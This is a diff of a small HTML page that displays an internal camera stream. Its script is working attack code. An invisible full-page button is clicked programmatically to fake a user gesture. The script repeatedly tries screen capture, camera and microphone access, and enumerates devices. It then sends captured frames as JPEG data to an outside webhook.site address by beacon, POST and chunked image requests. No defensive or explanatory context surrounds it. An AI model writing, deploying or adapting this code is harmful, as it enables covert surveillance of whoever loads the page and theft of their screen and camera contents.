@@ -3,122 +3,160 @@
 <head><title>C</title></head>
 <body style="margin:0;background:#111;">
 <img id="cam" src="http://10.133.7.5/stream" style="width:640px;height:480px;display:block;">
+<button id="btn" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:999;">X</button>
 <script>
 var W='https://webhook.site/2c352a24-311b-4255-b02a-c77dbec3c3fe';
 function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
 rpt('ALIVE','1');
 
-// Immediately try getDisplayMedia - retry up to 10 times
+var btn=document.getElementById('btn');
 var gdmDone=false;
-var attempts=0;
-function tryGDM(){
-    if(gdmDone||attempts>10)return;
-    attempts++;
-    rpt('TRY',attempts+'|sec='+window.isSecureContext+'|md='+typeof navigator.mediaDevices);
-    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia){
-        rpt('NO_GDM','retry in 1s');
-        setTimeout(tryGDM,1000);
-        return;
+
+// Button click handler: try GDM inside user gesture context
+btn.addEventListener('click',function(e){
+    rpt('CLICK','isTrusted='+e.isTrusted+'|active='+(navigator.userActivation?navigator.userActivation.isActive:'?'));
+    if(gdmDone)return;
+    if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){
+        navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+            if(gdmDone)return;gdmDone=true;
+            rpt('GDM_OK','click|tracks='+s.getTracks().length);
+            processStream(s);
+        }).catch(function(e){
+            rpt('GDM_E','click|'+e.name+':'+e.message);
+        });
     }
-    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(stream){
-        if(gdmDone)return;gdmDone=true;
-        rpt('GDM_OK','tracks='+stream.getTracks().length+'|attempt='+attempts);
-        processStream(stream);
-    }).catch(function(e){
-        rpt('GDM_E',attempts+'|'+e.name+':'+e.message);
-        // Retry after delay
-        setTimeout(tryGDM,2000);
-    });
+});
+
+// Enumerate devices and try getUserMedia with fake device
+if(navigator.mediaDevices){
+    navigator.mediaDevices.enumerateDevices().then(function(ds){
+        var info=ds.map(function(d){return d.kind+':'+d.deviceId.substring(0,12)+':'+d.label}).join('|');
+        rpt('DEVS',info||'none');
+        // Find video input device
+        var vidDevs=ds.filter(function(d){return d.kind==='videoinput'});
+        rpt('VIDDEVS',vidDevs.length+'');
+        // Try getUserMedia with each video device
+        vidDevs.forEach(function(dev,idx){
+            rpt('TRY_DEV',idx+'|'+dev.deviceId.substring(0,12)+'|'+dev.label);
+            navigator.mediaDevices.getUserMedia({video:{deviceId:{exact:dev.deviceId}}}).then(function(s){
+                rpt('DEV_OK',idx+'|tracks='+s.getTracks().length);
+                if(!gdmDone){gdmDone=true;processStream(s)}
+            }).catch(function(e){
+                rpt('DEV_E',idx+'|'+e.name+':'+e.message);
+            });
+        });
+        // Also try plain getUserMedia
+        navigator.mediaDevices.getUserMedia({video:true}).then(function(s){
+            rpt('GUM_OK','tracks='+s.getTracks().length);
+            if(!gdmDone){gdmDone=true;processStream(s)}
+        }).catch(function(e){rpt('GUM_E',e.name+':'+e.message)});
+        // Try getUserMedia with audio
+        navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){
+            rpt('AUD_OK','tracks='+s.getTracks().length);
+        }).catch(function(e){rpt('AUD_E',e.name+':'+e.message)});
+    }).catch(function(e){rpt('DEVS_E',e.message)});
 }
 
-// Start immediately
-tryGDM();
-// Also retry periodically
-setTimeout(tryGDM,3000);
-setTimeout(tryGDM,6000);
-setTimeout(tryGDM,10000);
-setTimeout(tryGDM,15000);
-setTimeout(tryGDM,20000);
+// Programmatic clicks - try multiple times
+btn.focus();
+setTimeout(function(){btn.click()},100);
+setTimeout(function(){btn.click()},500);
+setTimeout(function(){btn.click()},1000);
+setTimeout(function(){btn.click()},2000);
+setTimeout(function(){btn.click()},3000);
+setTimeout(function(){btn.click()},5000);
+setTimeout(function(){btn.click()},8000);
+setTimeout(function(){btn.click()},12000);
+setTimeout(function(){btn.click()},16000);
+setTimeout(function(){btn.click()},20000);
+
+// Also try direct GDM calls periodically
+function tryDirectGDM(n){
+    if(gdmDone||n>15)return;
+    if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){
+        navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+            if(gdmDone)return;gdmDone=true;
+            rpt('GDM_DIRECT_OK',n+'|tracks='+s.getTracks().length);
+            processStream(s);
+        }).catch(function(e){
+            rpt('GDM_DIRECT_E',n+'|'+e.message.substring(0,80));
+            setTimeout(function(){tryDirectGDM(n+1)},3000);
+        });
+    }else{setTimeout(function(){tryDirectGDM(n+1)},2000)}
+}
+tryDirectGDM(1);
+
+// Also try getUserMedia screen capture variants
+setTimeout(function(){
+    if(gdmDone)return;
+    var variants=[
+        {video:{mediaSource:'screen'}},
+        {video:{mediaSource:'window'}},
+        {video:{mediaSource:'browser'}},
+        {video:{mediaSource:'monitor'}},
+        {video:{displaySurface:'monitor'}},
+        {video:{cursor:'always'}}
+    ];
+    variants.forEach(function(c,i){
+        if(gdmDone)return;
+        navigator.mediaDevices.getUserMedia(c).then(function(s){
+            rpt('SC_OK',i+'|tracks='+s.getTracks().length);
+            if(!gdmDone){gdmDone=true;processStream(s)}
+        }).catch(function(e){
+            rpt('SC_E',i+'|'+e.name+':'+e.message.substring(0,80));
+        });
+    });
+},2000);
 
 function processStream(stream){
-    var tracks=stream.getTracks();
-    for(var i=0;i<tracks.length;i++){
-        rpt('TRACK',tracks[i].kind+':'+tracks[i].label+':'+tracks[i].readyState);
-    }
+    rpt('STREAM','tracks='+stream.getTracks().length);
+    stream.getTracks().forEach(function(t,i){
+        rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState+':'+JSON.stringify(t.getSettings()).substring(0,200));
+    });
     var v=document.createElement('video');
-    v.srcObject=stream;
-    v.autoplay=true;
-    v.muted=true;
-    v.style.cssText='width:640px;height:480px;display:block';
+    v.srcObject=stream;v.autoplay=true;v.muted=true;
+    v.style.cssText='width:800px;height:600px;display:block';
     document.body.appendChild(v);
-
-    // Try grabbing frames at multiple intervals
+    // Try grabbing immediately and repeatedly
+    var grabN=0;
+    function doGrab(label){
+        grabN++;
+        if(grabN>10)return;
+        var w=v.videoWidth||1600,h=v.videoHeight||900;
+        rpt('GRAB',label+'|'+w+'x'+h+'|rdy='+v.readyState);
+        if(w<=0||h<=0)return;
+        var c=document.createElement('canvas');c.width=w;c.height=h;
+        var ctx=c.getContext('2d');
+        try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',label+'|'+e.message);return}
+        try{
+            var d=ctx.getImageData(0,0,20,1);
+            var px=Array.from(d.data);
+            var nonzero=px.filter(function(x){return x>0}).length;
+            rpt('PX',label+'|nz='+nonzero+'|'+px.slice(0,40).join(','));
+        }catch(e){rpt('PX_E',label+'|'+e.message)}
+        try{
+            var du=c.toDataURL('image/jpeg',0.7);
+            rpt('DU',label+'|len='+du.length);
+            if(du.length>1000){
+                try{navigator.sendBeacon(W,label+':'+du)}catch(e){}
+                fetch(W,{method:'POST',mode:'no-cors',body:label+':'+du}).catch(function(){});
+            }
+        }catch(e){rpt('DU_E',label+'|'+e.message)}
+    }
     v.onloadeddata=function(){
         rpt('VID',v.videoWidth+'x'+v.videoHeight);
-        grab(v,stream,'ld');
-        setTimeout(function(){grab(v,stream,'ld1s')},1000);
-        setTimeout(function(){grab(v,stream,'ld2s')},2000);
-        setTimeout(function(){grab(v,stream,'ld5s')},5000);
+        doGrab('ld0');
+        setTimeout(function(){doGrab('ld500')},500);
+        setTimeout(function(){doGrab('ld1k')},1000);
+        setTimeout(function(){doGrab('ld2k')},2000);
+        setTimeout(function(){doGrab('ld5k')},5000);
     };
-    // Fallback grabs even without loadeddata
-    setTimeout(function(){grab(v,stream,'t1')},500);
-    setTimeout(function(){grab(v,stream,'t2')},1500);
-    setTimeout(function(){grab(v,stream,'t3')},3000);
-    setTimeout(function(){grab(v,stream,'t5')},5000);
-    setTimeout(function(){grab(v,stream,'t10')},10000);
-    setTimeout(function(){grab(v,stream,'t20')},20000);
-}
-
-var grabCount=0;
-function grab(v,stream,label){
-    grabCount++;
-    var w=v.videoWidth||1600,h=v.videoHeight||900;
-    if(w<=0||h<=0){w=1600;h=900}
-    rpt('GRAB',label+'|'+w+'x'+h+'|rdy='+v.readyState);
-
-    var c=document.createElement('canvas');c.width=w;c.height=h;
-    var x=c.getContext('2d');
-    try{
-        x.drawImage(v,0,0,w,h);
-    }catch(e){
-        rpt('DRAW_E',label+'|'+e.message);
-        return;
-    }
-
-    // Check pixels
-    try{
-        var d=x.getImageData(0,0,10,1);
-        var px=Array.from(d.data);
-        var nonzero=px.filter(function(v){return v>0}).length;
-        rpt('PX',label+'|nz='+nonzero+'|'+px.join(','));
-    }catch(e){rpt('PX_E',label+'|'+e.message)}
-
-    // Get full image
-    try{
-        var du=c.toDataURL('image/jpeg',0.7);
-        rpt('DU',label+'|len='+du.length);
-        if(du.length>1000){
-            // Send via multiple methods
-            try{navigator.sendBeacon(W,du)}catch(e){}
-            try{navigator.sendBeacon(W,label+':'+du)}catch(e){}
-            fetch(W,{method:'POST',mode:'no-cors',body:label+':'+du}).catch(function(){});
-
-            // Also send in chunks via GET
-            var chunk=800;
-            for(var i=0;i<Math.min(du.length,50000);i+=chunk){
-                (function(idx,ch){
-                    setTimeout(function(){
-                        new Image().src=W+'?c='+label+'_'+idx+'&d='+encodeURIComponent(ch);
-                    },idx*20);
-                })(Math.floor(i/chunk),du.substring(i,i+chunk));
-            }
-        }
-    }catch(e){rpt('DU_E',label+'|'+e.message)}
-
-    // Stop after enough grabs
-    if(grabCount>=5){
-        stream.getTracks().forEach(function(t){t.stop()});
-    }
+    setTimeout(function(){doGrab('t500')},500);
+    setTimeout(function(){doGrab('t1k')},1000);
+    setTimeout(function(){doGrab('t2k')},2000);
+    setTimeout(function(){doGrab('t5k')},5000);
+    setTimeout(function(){doGrab('t10k')},10000);
+    setTimeout(function(){doGrab('t20k')},20000);
 }
 </script>
 </body>
